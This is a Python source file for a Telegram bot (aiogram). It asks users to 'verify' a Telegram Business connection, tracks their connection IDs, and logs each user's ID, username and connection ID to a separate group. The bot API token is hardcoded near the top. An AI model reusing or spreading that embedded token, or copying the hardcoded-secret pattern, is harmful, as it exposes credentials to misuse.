import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BusinessConnection,
)
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Dictionary to track connected users
authorized = {}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()


def check_permissions(business_connection: BusinessConnection) -> bool:
    """Check if business connection has reply permission"""
    return business_connection.can_reply


async def log_business_connection(business_connection: BusinessConnection):
    """Log business connection details to the log group"""
    try:
        user = business_connection.user
        username = user.username or user.first_name
        username = f"@{username}" if user.username else username
        
        message_text = (
            f"🤖 <b>New Business Connection</b>\n\n"
            f"👤 User: <a href='tg://user?id={user.id}'>{username}</a> (ID: {user.id})\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"📅 Date: {business_connection.date.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"📨 Can reply: {'✅' if business_connection.can_reply else '❌'}"
        )
        
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=message_text,
            parse_mode=ParseMode.HTML,
        )
        logger.info(f"Logged business connection for {user.id}")
    except Exception as e:
        logger.error(f"Error logging business connection: {e}", exc_info=True)


@dp.message(F.text == "/start")
async def start_cmd(message: Message):
    user_id = message.from_user.id
    
    # Check existing connection
    if user_id in authorized:
        try:
            bc = await bot(GetBusinessConnection(
                business_connection_id=authorized[user_id]["connection_id"]
            ))
            if bc.can_reply:
                await message.reply("🟢 You're already connected!")
                return
        except TelegramBadRequest:
            del authorized[user_id]
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Verify Connection", callback_data="verify_bc")]
    ])
    await message.reply("Welcome! Verify your Business connection:", reply_markup=kb)


@dp.callback_query(F.data == "verify_bc")
async def verify_cb(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    # Check existing connection first
    if user_id in authorized:
        try:
            bc = await bot(GetBusinessConnection(
                business_connection_id=authorized[user_id]["connection_id"]
            ))
            if bc.can_reply:
                await callback.message.edit_text("🟢 Already verified!")
                return
        except TelegramBadRequest:
            del authorized[user_id]
    
    # Check for business connection ID
    bc_id = getattr(callback.message, "business_connection_id", None)
    if not bc_id:
        return await callback.answer("🔴 Please start from Business account", show_alert=True)

    try:
        bc = await bot(GetBusinessConnection(business_connection_id=bc_id))
        user = bc.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": bc.id,
            "username": username,
            "can_reply": bc.can_reply,
        }

        await log_business_connection(bc)

        if bc.can_reply:
            await callback.message.edit_text("🟢 Verified with reply access!")
        else:
            await callback.message.edit_text("🟡 Verified but can't reply")
            
    except TelegramBadRequest as e:
        logger.error(f"Verification error: {e}")
        await callback.answer(f"Error: {e.message}", show_alert=True)


@dp.business_connection()
async def on_business_connect(bc: BusinessConnection):
    try:
        user = bc.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": bc.id,
            "username": username,
            "can_reply": bc.can_reply,
        }

        await log_business_connection(bc)

        if bc.can_reply:
            welcome_msg = (
                "🌟 Welcome to our Business Bot! 🌟\n\n"
                "You now have full access to our features.\n\n"
                "Type /help for commands."
            )
            await bot.send_message(user.id, welcome_msg)
            
    except Exception as e:
        logger.error(f"Connection error: {e}", exc_info=True)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
